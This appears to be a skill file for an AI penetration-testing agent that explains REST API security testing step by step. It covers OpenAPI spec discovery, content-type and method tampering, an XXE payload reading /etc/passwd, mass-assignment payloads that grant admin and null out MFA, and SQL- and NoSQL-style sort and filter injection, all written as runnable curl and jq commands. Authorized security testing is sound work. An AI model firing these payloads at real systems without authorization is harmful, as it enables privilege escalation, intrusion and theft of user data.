---
name: rest-api-testing
description: >
  Comprehensive REST API security testing skill combining OpenAPI/Swagger schema-driven
  test generation with manual testing techniques. Use when testing REST APIs, analyzing
  OpenAPI specs, performing content-type attacks, HTTP method tampering, API versioning
  bypass, HATEOAS exploration, pagination injection, or REST-specific mass assignment.
  Covers full OWASP API Top 10 from a REST-specific perspective.
allowed-tools: Read, Grep, Glob, Bash
---

# REST API Security Testing

## When to Use This Skill
- Target exposes REST API endpoints
- OpenAPI/Swagger documentation is found or suspected
- Testing content-type handling, method routing, or versioning
- Performing REST-specific BOLA, mass assignment, or input validation
- Analyzing API responses for data leakage or schema violations
- Testing pagination, filtering, sorting injection vectors

## Phase 1: Schema Discovery & Analysis

### Locate OpenAPI/Swagger Specifications

Run endpoint discovery for common spec locations:
```bash
# Quick spec discovery with ffuf
ffuf -w /path/to/wordlists/openapi-paths.txt -u https://TARGET/FUZZ \
  -mc 200 -t 10 -o spec-discovery.json -of json

# Manual checks for common locations
for path in openapi.json openapi.yaml swagger.json swagger.yaml api-docs \
  v1/api-docs v2/api-docs v3/api-docs api/swagger.json api/openapi.json \
  docs/api .well-known/openapi api/docs api/schema api-docs.json \
  swagger-ui swagger-ui/index.html swagger-resources; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://TARGET/$path")
  [ "$code" = "200" ] && echo "FOUND: https://TARGET/$path ($code)"
done

# Check JS bundles for embedded specs
katana -u https://TARGET -d 3 -jc -silent | grep -iE '\.(js|json)' | sort -u | \
  while read url; do
    curl -s "$url" 2>/dev/null | grep -l 'openapi\|swagger\|"paths"' && echo "SPEC IN: $url"
  done
```

### Parse and Analyze Spec

Once found, extract the attack surface:
```bash
# Save and validate spec
curl -s https://TARGET/openapi.json | jq . > spec.json

# Full endpoint inventory with methods
jq -r '.paths | to_entries[] | .key as $path |
  .value | to_entries[] | select(.key != "parameters") |
  "\(.key|ascii_upcase) \($path)"' spec.json | sort > endpoints.txt

# BOLA candidates (endpoints with path params)
grep -E '\{[^}]+\}' endpoints.txt > bola-candidates.txt

# Admin/sensitive endpoints
grep -iE '(admin|internal|debug|manage|config|secret|private|system)' endpoints.txt > admin-endpoints.txt

# Endpoints without auth requirements
jq -r '.paths | to_entries[] | .key as $path |
  .value | to_entries[] | select(.key != "parameters") |
  select((.value.security // "unset") == [] or (.value.security // "unset") == "unset") |
  "\(.key|ascii_upcase) \($path)"' spec.json > no-auth-endpoints.txt

# Extract all unique parameter names for fuzzing
jq -r '[.. | objects | .name? // empty] | unique | .[]' spec.json > spec-params.txt

# Find readOnly fields (mass assignment targets)
jq -r '.. | objects | select(.readOnly == true) // empty' spec.json 2>/dev/null

# Deprecated but accessible endpoints
jq -r '.paths | to_entries[] | .key as $path |
  .value | to_entries[] | select(.value.deprecated == true) |
  "DEPRECATED: \(.key|ascii_upcase) \($path)"' spec.json
```

### Generate Test Matrices from Spec

```bash
# Create BOLA test script from spec
while read line; do
  method=$(echo "$line" | awk '{print $1}')
  path=$(echo "$line" | awk '{print $2}')
  # Replace path params with test IDs
  test_path=$(echo "$path" | sed 's/{[^}]*}/TESTID/g')
  echo "echo 'Testing $method $path'"
  echo "curl -s -o /dev/null -w '%{http_code}' -X $method 'https://TARGET$test_path' -H 'Authorization: Bearer USER_B_TOKEN'"
done < bola-candidates.txt > bola-test-script.sh

# Create mass assignment payloads from response schemas
jq -r '.paths | to_entries[] | .key as $path |
  .value | to_entries[] | select(.key == "get") |
  .value.responses["200"].content["application/json"].schema' spec.json 2>/dev/null
```

## Phase 2: Content-Type & Method Testing

### Content-Type Negotiation
```bash
# Test endpoint response to different content types
ENDPOINT="https://TARGET/api/endpoint"
TOKEN="Bearer YOUR_TOKEN"
BODY='{"test":"value"}'

for ct in "application/json" "application/xml" "application/x-www-form-urlencoded" \
  "text/plain" "application/json;charset=utf-7" "application/vnd.api+json" \
  "multipart/form-data" "application/csp-report" "text/xml"; do
  echo -n "$ct: "
  curl -s -o /dev/null -w "%{http_code} %{size_download}b" \
    -X POST "$ENDPOINT" -H "Content-Type: $ct" -H "Authorization: $TOKEN" -d "$BODY"
  echo
done
```

If XML is accepted, test XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><test>&xxe;</test></root>
```

### HTTP Method Enumeration
```bash
ENDPOINT="https://TARGET/api/resource/123"
TOKEN="Bearer YOUR_TOKEN"

for method in GET POST PUT PATCH DELETE HEAD OPTIONS TRACE; do
  echo -n "$method: "
  curl -s -o /dev/null -w "%{http_code}" -X $method "$ENDPOINT" \
    -H "Authorization: $TOKEN" -H "Content-Type: application/json"
  echo
done

# Test method override headers
for header in "X-HTTP-Method-Override" "X-Method-Override" "X-HTTP-Method" \
  "_method" "X-HTTP-Method-Override"; do
  for method in PUT DELETE PATCH; do
    echo -n "$header: $method -> "
    curl -s -o /dev/null -w "%{http_code}" -X POST "$ENDPOINT" \
      -H "$header: $method" -H "Authorization: $TOKEN"
    echo
  done
done
```

### API Version Testing
```bash
BASE="https://TARGET"
RESOURCE="/users/me"
TOKEN="Bearer YOUR_TOKEN"

# Path-based versioning
for v in v0 v1 v2 v3 v4 api/v1 api/v2 api/v3; do
  echo -n "$v: "
  curl -s -o /dev/null -w "%{http_code}" "$BASE/$v$RESOURCE" -H "Authorization: $TOKEN"
  echo
done

# Header-based versioning
for v in 1 2 3 "2021-01-01" "2022-01-01" "2023-01-01" "2024-01-01"; do
  echo -n "Api-Version $v: "
  curl -s -o /dev/null -w "%{http_code}" "$BASE/api$RESOURCE" \
    -H "Api-Version: $v" -H "Authorization: $TOKEN"
  echo
done

# Accept header versioning
for v in v1 v2 v3; do
  echo -n "Accept $v: "
  curl -s -o /dev/null -w "%{http_code}" "$BASE/api$RESOURCE" \
    -H "Accept: application/vnd.api.$v+json" -H "Authorization: $TOKEN"
  echo
done
```

## Phase 3: REST-Specific Vulnerability Testing

### Mass Assignment via PUT/PATCH
```bash
ENDPOINT="https://TARGET/api/users/me"
TOKEN="Bearer YOUR_TOKEN"

# Step 1: GET current resource to see all fields
curl -s "$ENDPOINT" -H "Authorization: $TOKEN" | jq . > original-response.json

# Step 2: Extract field names from response
jq -r 'keys[]' original-response.json > response-fields.txt

# Step 3: Try writing each field back with modified values
# Especially target: role, admin, verified, credits, permissions, tier, plan
PRIVESC_FIELDS='{"role":"admin","is_admin":true,"admin":true,"verified":true,"email_verified":true,"permissions":["*"],"tier":"enterprise","plan":"premium","credits":999999,"balance":999999}'

echo "PUT mass assignment:"
curl -s -X PUT "$ENDPOINT" -H "Authorization: $TOKEN" \
  -H "Content-Type: application/json" -d "$PRIVESC_FIELDS" | jq .

echo "PATCH mass assignment:"
curl -s -X PATCH "$ENDPOINT" -H "Authorization: $TOKEN" \
  -H "Content-Type: application/json" -d "$PRIVESC_FIELDS" | jq .

# JSON Patch format (RFC 6902)
echo "JSON Patch:"
curl -s -X PATCH "$ENDPOINT" -H "Authorization: $TOKEN" \
  -H "Content-Type: application/json-patch+json" \
  -d '[{"op":"replace","path":"/role","value":"admin"}]' | jq .

# JSON Merge Patch - null deletion attack (RFC 7396)
echo "Merge Patch null deletion:"
curl -s -X PATCH "$ENDPOINT" -H "Authorization: $TOKEN" \
  -H "Content-Type: application/merge-patch+json" \
  -d '{"mfa_enabled":null,"password_reset_required":null}' | jq .
```

### Pagination & Filter Injection
```bash
ENDPOINT="https://TARGET/api/users"
TOKEN="Bearer YOUR_TOKEN"

# Pagination abuse
for param in "per_page=999999" "limit=-1" "page_size=100000" "count=999999" \
  "offset=-1" "skip=-1"; do
  echo -n "$param: "
  curl -s -o /dev/null -w "%{http_code} %{size_download}b" \
    "$ENDPOINT?$param" -H "Authorization: $TOKEN"
  echo
done

# Sort/order injection
for payload in "sort=password" "sort=secret" "order_by=1" \
  "sort=name;--" "sort=CASE WHEN (1=1) THEN name ELSE email END"; do
  echo -n "Sort: $payload -> "
  curl -s -o /dev/null -w "%{http_code}" \
    "$ENDPOINT?$(python3 -c "import urllib.parse; print(urllib.parse.urlencode({'x':'$payload'})[2:])")" \
    -H "Authorization: $TOKEN"
  echo
done

# Field selection injection
for payload in "fields=password,api_key,secret" "select=*" \
  "fields[]=password&fields[]=token" "include=credentials"; do
  echo "Fields: $payload"
  curl -s "$ENDPOINT?$payload" -H "Authorization: $TOKEN" | jq . 2>/dev/null | head -20
  echo "---"
done

# Filter injection (NoSQL-style)
for payload in 'filter={"role":"admin"}' 'where={"role":"admin"}' \
  'query={"role":{"$ne":"user"}}' 'filter[$gt]=""'; do
  echo "Filter: $payload"
  curl -s "$ENDPOINT?$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")" \
    -H "Authorization: $TOKEN" | jq . 2>/dev/null | head -10
  echo "---"
done
```

### HATEOAS Link Exploration
```bash
ENTRYPOINT="https://TARGET/api/"
TOKEN="Bearer YOUR_TOKEN"

# Discover links from API root
echo "=== API Root Links ==="
curl -s "$ENTRYPOINT" -H "Authorization: $TOKEN" | \
  jq -r '.. | objects | (.href // .url // .link // .self // empty)' 2>/dev/null | sort -u

# Recursively follow links (depth 2)
curl -s "$ENTRYPOINT" -H "Authorization: $TOKEN" | \
  jq -r '.. | objects | (.href // .url // .link // empty)' 2>/dev/null | sort -u | \
  while read link; do
    echo "Following: $link"
    curl -s "$link" -H "Authorization: $TOKEN" | \
      jq -r '.. | objects | (.href // .url // .link // empty)' 2>/dev/null
  done | sort -u > discovered-links.txt

echo "=== Discovered $(wc -l < discovered-links.txt) unique links ==="
```

### Response Differential Analysis
```bash
ENDPOINT="https://TARGET/api/users/TARGET_ID"
ADMIN_TOKEN="Bearer ADMIN_TOKEN"
USER_TOKEN="Bearer USER_TOKEN"

# Auth level comparison
echo "=== Admin vs User Response Diff ==="
diff <(curl -s "$ENDPOINT" -H "Authorization: $ADMIN_TOKEN" | jq -S .) \
     <(curl -s "$ENDPOINT" -H "Authorization: $USER_TOKEN" | jq -S .) || true

# Auth vs no-auth
echo "=== Authenticated vs Unauthenticated ==="
diff <(curl -s "$ENDPOINT" -H "Authorization: $USER_TOKEN" | jq -S .) \
     <(curl -s "$ENDPOINT" | jq -S .) || true

# Field count comparison
echo "=== Field Counts ==="
echo "Admin fields: $(curl -s "$ENDPOINT" -H "Authorization: $ADMIN_TOKEN" | jq 'keys | length')"
echo "User fields: $(curl -s "$ENDPOINT" -H "Authorization: $USER_TOKEN" | jq 'keys | length')"
echo "No-auth fields: $(curl -s "$ENDPOINT" | jq 'keys | length' 2>/dev/null)"
```

## Phase 4: Reporting

Compile findings into structured reports:
- `reports/rest-api/spec-analysis.json` -- endpoint inventory with risk annotations
- `reports/rest-api/bola-matrix.md` -- BOLA test results per endpoint
- `reports/rest-api/auth-gaps.md` -- endpoints with missing/weak auth
- `reports/rest-api/mass-assignment.md` -- writable field discoveries
- `reports/rest-api/content-type-results.md` -- content-type handling anomalies
- `reports/rest-api/version-diff.md` -- differences across API versions
- `reports/rest-api/findings.md` -- validated vulnerabilities with PoC

## Tool Quick Reference

| Task | Command |
|------|---------|
| Spec discovery | `ffuf -w openapi-paths.txt -u TARGET/FUZZ -mc 200` |
| Endpoint extraction | `jq -r '.paths|to_entries[]|.key' spec.json` |
| BOLA candidates | `grep -E '\\{[^}]+\\}' endpoints.txt` |
| Method fuzzing | `ffuf -w methods.txt -u TARGET/api/endpoint -X FUZZ -mc all -fc 405` |
| Param discovery | `arjun -u TARGET/api/endpoint -m JSON -oJ params.json` |
| Content-type fuzz | `ffuf -w ct.txt:CT -u TARGET -H "Content-Type: CT" -mc all -fc 415` |
| Route brute-force | `kr scan TARGET -A=apiroutes-210328:20000 -x 5 -j 100` |
| Version enum | `ffuf -w versions.txt:V -u TARGET/api/V/resource -mc 200` |
| Mass assignment | `curl -X PUT TARGET/api/resource -d '{"role":"admin"}'` |
| Response diff | `diff <(curl -s -H "Auth: A" URL \| jq .) <(curl -s -H "Auth: B" URL \| jq .)` |

## Validate & Promote

Findings from this skill are born `theoretical` (see the validation layer in the repo-root `CLAUDE.md`). They do NOT enter a report or external submission until promoted to `confirmed` with `scripts/validate-finding.sh`, after the independent check below.

- **Independent check for this class:** For mass assignment, re-read the object (or decode the new token) to prove the privileged field PERSISTED server-side - a reflected body is not proof. For method/version bypass, show the alternate path returns data the canonical one denies.
- Only `confirmed` findings ship. `validated` = reproduced but not independently confirmed.

```bash
bash scripts/validate-finding.sh --project-dir "$PROJECT_DIR" --agent specter \
  --id SPE-NNN --state confirmed --method manual-repro \
  --negative-control "<what you proved, and the control result>" --by specter
```
